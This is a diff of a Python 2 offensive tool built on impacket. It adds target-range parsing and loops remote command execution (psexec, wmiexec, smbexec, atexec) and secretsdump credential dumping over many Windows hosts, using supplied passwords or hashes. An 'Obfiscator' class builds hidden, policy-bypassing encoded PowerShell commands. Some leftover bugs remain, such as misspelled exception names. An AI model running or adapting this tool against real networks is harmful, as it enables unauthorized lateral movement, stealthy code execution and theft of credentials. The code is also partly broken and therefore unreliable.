@@ -37,7 +37,7 @@ except:
 try:
     import netaddr
 except:
-    sys.exit("[!] Install the netifaces library: pip install netaddr")
+    sys.exit("[!] Install the netaddr library: pip install netaddr")
 try:
     import psexec, smbexec, atexec
     import wmiexec as wmiexec
@@ -47,61 +47,58 @@ except Exception as e:
     sys.exit("[!] Install the necessary impacket libraries and move this script to the examples directory within it")
 
 class TargetConverter:
-    def __init__(self, targets):
-        self.targets
-		self.cidr_noted = ""
-		self.range_value1 = ""
-		self.range_value2 = ""
-		self.ip_list = []
-		self.target_list = []
+    def __init__(self, target):
+        self.target = target
+        self.cidr_noted = ""
+        self.range_value1 = ""
+        self.range_value2 = ""
+        self.ip_list = []
+        self.target_list = []
         try:
             self.run()
         except Exception, e:
             print("[!] There was an error %s") % (str(e))
             sys.exit(1)
-	
+
     def run(self):
-	    for target in self.targets:
-		    if "-" in target:
-		        range_value1, range_value2 = targets.split('-')
-     		    if len(range_value2) <= 3:
-				    self.range_value1 = range_value1
-					self.range_value2 = range_value2
-			    else:
-				    self.range_value1 = range_value1
-					octet1, octet2, octet3, octet4 = range_value1.split('.')
-					self.range_value2 = octet1 + "." + octet2 + "." + octet3 + "." + range_value2
-				print(self.range_value1) #DEBUG
-				print(self.range_value2) #DEBUG
-			    self.ip_list.extend(self.range_to_list())
-			if "/" in target:
-			    self.cidr_noted = target
-				print(self.cidr_noted) #DEBUG
-			    self.ip_list.extend(self.cidr_to_list())
-			else:
-			    self.ip_list.append(target)
-    
+        range_true = re.search(r'-',self.target)
+        if "-" in self.target:
+            range_value1, range_value2 = self.target.split('-')
+            if len(range_value2) > 3:
+                self.range_value1 = range_value1
+                self.range_value2 = range_value2
+                self.ip_list.extend(self.range_to_list())
+            else:
+                self.range_value1 = range_value1
+                octet1, octet2, octet3, octet4 = self.range_value1.split('.')
+                self.range_value2 = octet1 + "." + octet2 + "." + octet3 + "." + range_value2
+                self.ip_list.extend(self.range_to_list())
+        elif "/" in self.target:
+            self.cidr_noted = self.target
+            self.ip_list.extend(self.cidr_to_list())
+        else:
+            self.ip_list.append(self.target)
+
     def cidr_to_list(self):
         ip_list = []
-        for ip in IPNetwork(self.cidr_noted).iter_hosts():
+        for ip in netaddr.IPNetwork(self.cidr_noted).iter_hosts():
             ip_list.append(ip)
-	    return ip_list
+        return(ip_list)
 
     def range_to_list(self):
         ip_list = []
-        ip_list = list(iter_iprange(range_value1, range_value2)
-	    return ip_list
-	
-	def return_targets(self):
+        ip_list = list(netaddr.iter_iprange(self.range_value1, self.range_value2))
+        return(ip_list)
+
+    def return_targets(self):
         try:
-		    for ip in self.ip_list:
-			    print(str(ip)) #DEBUG
-				self.target_list.append(str(ip))
+            for ip in self.ip_list:
+                self.target_list.append(str(ip))
             return(self.target_list)
         except Exception, e:
             print("[!] There was an error %s") % (str(e))
             sys.exit(1)
-			
+
 class Obfiscator:
     def __init__(self, src_ip, src_port, payload, function, argument, execution, methods, group, dst_ip="", dst_port=""):
         self.src_ip = src_ip
@@ -144,7 +141,7 @@ class Obfiscator:
         encoded_base64 = base64.b64encode(encoded_utf)
         command = "powershell.exe -nop -w hidden -exec bypass -enc %s" % (encoded_base64)
         return(command)
-    
+
     def clearer(self, cleartext):
         command = 'powershell.exe -nop -w hidden -exec bypass "' + cleartext + '"'
         return(command)
@@ -276,9 +273,9 @@ Create Pasteable Double Encoded Script:
     attack.add_argument("--command", action="store", dest="command", default="cmd.exe", help="Set the command that will be executed, default is cmd.exe")
     attack.add_argument("--group-members", action="store", dest="group", help="Identifies members of Domain Groups through PowerShell")
     remote_attack.add_argument("-t", action="store", dest="target", default=None, help="The targets you are attempting to exploit")
-    remote_attack.add_argument("-e", action="store", dest="execption", default=None, help="The exceptions to the targets you do not want to exploit, yours is inlcuded by default")
-    remote_attack.add_argument("-tl", action="store", dest="target_file", default=None, help="The targets file with systems you want to exploit, delinated by new lines")
-    remote_attack.add_argument("-el", action="store", dest="exception_file", default=None, help="The exceptions file with systems you do not want to exploit, delinated by new lines")
+    remote_attack.add_argument("-e", action="store", dest="exceptor", default=None, help="The exceptions to the targets you do not want to exploit, yours is inlcuded by default")
+    remote_attack.add_argument("-tl", action="store", dest="target_filename", default=None, help="The targets file with systems you want to exploit, delinated by new lines")
+    remote_attack.add_argument("-el", action="store", dest="exception_filename", default=None, help="The exceptions file with systems you do not want to exploit, delinated by new lines")
     remote_attack.add_argument("--dom", action="store", dest="dom", default="WORKGROUP", help="The domain the user is apart of, defaults to WORKGROUP")
     remote_attack.add_argument("--usr", action="store", dest="usr", default=None, help="The username that will be used to exploit the system")
     remote_attack.add_argument("--pwd", action="store", dest="pwd", default=None, help="The password that will be used to exploit the system")
@@ -332,9 +329,9 @@ Create Pasteable Double Encoded Script:
     pwd = args.pwd
     dom = args.dom
     target = args.target
-    target_file = args.target_file
-    exception = args.exception
-    exception_file = args.exeception_file
+    target_filename = args.target_filename
+    exceptor = args.exceptor
+    exception_filename = args.exception_filename
     command = args.command
     filename = args.filename
     sam_dump = args.sam_dump
@@ -359,6 +356,7 @@ Create Pasteable Double Encoded Script:
     methods = False
     attacks = True
     method_dict = {}
+    dst = ""
 
     if aes != None:
         kerberos = True
@@ -397,8 +395,7 @@ Create Pasteable Double Encoded Script:
         if usr == None or pwd == None:
             print(2)
             sys.exit("[!] If you are trying to exploit a system you need a username and password")
-        if target == None:
-            print(1)
+        if target == None and target_filename == None:
             sys.exit("[!] If you are trying to exploit a system you need at least one target")
 
     gateways = get_gateways()
@@ -406,53 +403,58 @@ Create Pasteable Double Encoded Script:
     if src_ip == None:
         try:
            src_ip = network_ifaces[interface]['addr']
-        except Exception as e:
+        except Exception, e:
             print("[!] No IP address found on interface %s") % (interface)
 
-	with open(target_filename) as f:
-        targets_list = f.read().splitlines()
-        
-    if "," in target:
-        targets_list.extend(targets.split(','))
-    else:
-        targets_list.append(targets)
-	for item in targets_list:
-	    try:
-		    tgt = TargetConverter(item)
-		except Exception, as e:
-		    print("[!] The following error occurred %s") % (e)
-			sys.exit(1)
-		try:
-		    tgt_list.extend(tgt.return_targets())
-			print(tgt_list) #DEBUG
-		except Exception, as e:
-		    print("[!] The following error occurred %s") % (e)
-			sys.exit(1)
+    with open(target_filename) as f:
+        targets_list = [line.rstrip() for line in f]
 
-	with open(exceptiont_filename) as f:
-        exceptions_list = f.read().splitlines()
-        
-    if "," in exception:
-        exceptions_list.extend(targets.split(','))
+    if target and "," in target:
+        targets_list.extend(target.split(','))
+    elif target:
+        targets_list.append(target)
+    elif targets_list:
+        for item in targets_list:
+            try:
+                tgt = TargetConverter(item)
+            except Exception, e:
+                print("[!] The following error occurred %s") % (e)
+                sys.exit(1)
+            try:
+                tgt_list.extend(tgt.return_targets())
+            except Exception, e:
+                print("[!] The following error occurred %s") % (e)
+                sys.exit(1)
     else:
-        exceptions_list.append(exception)
-	for item in exceptions_list:
-	    try:
-		    exc = TargetConverter(item)
-		except Exception, as e:
-		    print("[!] The following error occurred %s") % (e)
-			sys.exit(1)
-		try:
-		    exc_list.extend(exc.return_targets())
-			print(exc_list) #DEBUG
-		except Exception, as e:
-		    print("[!] The following error occurred %s") % (e)
-			sys.exit(1)
+        tgt_list.extend(targets_list)
+
+    with open(exception_filename) as f:
+        exceptions_list = [line.rstrip() for line in f]
+
+    if exceptor and "," in exceptor:
+        exceptions_list.extend(targets.split(','))
+    elif exceptor:
+        exceptions_list.append(exceptor)
+    elif exceptions_list:
+        for item in exceptions_list:
+            try:
+                exc = TargetConverter(item)
+            except Exception, e:
+                print("[!] The following error occurred %s") % (e)
+                sys.exit(1)
+            try:
+                exc_list.extend(exc.return_targets())
+            except Exception, e:
+                print("[!] The following error occurred %s") % (e)
+                sys.exit(1)
+    else:
+        exc_list.extend(exceptions_list)
+
     exc_list.append(src_ip)
-    tgt_list = list(set(tgt_list)).sorted
-    exc_list = list(set(exc_list)).sorted
+    tgt_list = list(set(tgt_list))
+    exc_list = list(set(exc_list))
     final_targets = [ip for ip in tgt_list if ip not in exc_list]
-    print(final_targets) #DEBUG
+    final_targets.sort()
 
     if invoker:
         execution = "invoker"
@@ -494,55 +496,58 @@ Create Pasteable Double Encoded Script:
 
     if methods and sam_dump:
         sys.exit("[!] You do not execute the --secrets-dump with a method, it should be executed on its own.")
-    if psexec_cmd:
-        if pwd != "":
-            print("[*] Attempting to access the system with, user: %s hash: %s domain: %s ") % (usr, hash, dom)
+    if not final_targets:
+        sys.exit("[!] No targets to exploit")
+    for dst in final_targets:
+        if psexec_cmd:
+            if hash:
+                print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
+            else:
+                print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+            attack=psexec.PSEXEC(command, path=directory, protocols=protocol, username = usr, password = pwd, domain = dom, hashes = hash, copyFile = None, exeFile = None, aesKey = aes, doKerberos = kerberos)
+            attack.run(dst)
+        elif wmiexec_cmd:
+            if hash:
+                print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
+            else:
+                print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+            if command == "cmd.exe":
+                sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
+            if attacks and not encoder:
+                attack=wmiexec.WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
+                attack.run(dst)
+            else:
+                attack=wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
+                attack.run(dst)
+        elif smbexec_cmd:
+            if hash:
+                print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
+            else:
+                print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+            attack=smbexec.CMDEXEC(protocols = protocol, username = usr, password = pwd, domain = dom, hashes = hash,  aesKey = aes, doKerberos = kerberos, mode = mode, share = share)
+            attack.run(dst)
+        elif atexec_cmd:
+            if hash:
+                print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
+            else:
+                print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+            if command == "cmd.exe":
+                sys.exit("[!] Please provide a viable command for execution")
+            attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command)
+            attack.play(dst)
+        elif sam_dump:
+            if hash:
+                print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
+            else:
+                print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+            attack=secretsdump.DumpSecrets(address = dst, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, system = system, security = security, sam = sam, ntds = ntds)
+            try:
+                attack.dump()
+            except Execption, e:
+                print("[!] An error occured during execution")
         else:
-            print("[*] Attempting to access the system with, user: %s pwd: %s domain: %s ") % (usr, pwd, dom)
-        attack=psexec.PSEXEC(command, path=directory, protocols=protocol, username = usr, password = pwd, domain = dom, hashes = hash, copyFile = None, exeFile = None, aesKey = aes, doKerberos = kerberos)
-        attack.run(target)
-    elif wmiexec_cmd:
-        if hash:
-            print("[*] Attempting to access the system with, user: %s hash: %s domain: %s ") % (usr, hash, dom)
-        else:
-            print("[*] Attempting to access the system with, user: %s pwd: %s domain: %s ") % (usr, pwd, dom)
-        if command == "cmd.exe":
-            sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
-        if attacks and not encoder:
-            attack=wmiexec.WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
-            attack.run(target)
-        else:
-            attack=wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
-            attack.run(target)
-    elif smbexec_cmd:
-        if hash:
-            print("[*] Attempting to access the system with, user: %s hash: %s domain: %s ") % (usr, hash, dom)
-        else:
-            print("[*] Attempting to access the system with, user: %s pwd: %s domain: %s ") % (usr, pwd, dom)
-        attack=smbexec.CMDEXEC(protocols = protocol, username = usr, password = pwd, domain = dom, hashes = hash,  aesKey = aes, doKerberos = kerberos, mode = mode, share = share)
-        attack.run(target)
-    elif atexec_cmd:
-        if hash:
-            print("[*] Attempting to access the system with, user: %s hash: %s domain: %s ") % (usr, hash, dom)
-        else:
-            print("[*] Attempting to access the system with, user: %s pwd: %s domain: %s ") % (usr, pwd, dom)
-        if command == "cmd.exe":
-            sys.exit("[!] Please provide a viable command for execution")
-        attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command)
-        attack.play(target)
-    elif sam_dump:
-        if hash:
-            print("[*] Attempting to access the system with, user: %s hash: %s domain: %s ") % (usr, hash, dom)
-        else:
-            print("[*] Attempting to access the system with, user: %s pwd: %s domain: %s ") % (usr, pwd, dom)
-        attack=secretsdump.DumpSecrets(address = target, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, system = system, security = security, sam = sam, ntds = ntds)
-        try:
-            attack.dump()
-        except Execption as e:
-            print("[!] An error occured during execution")
-    else:
-        print(instructions)
-        print(x.return_command())
+            print(instructions)
+            print(x.return_command())
 
 if __name__ == '__main__':
     main()
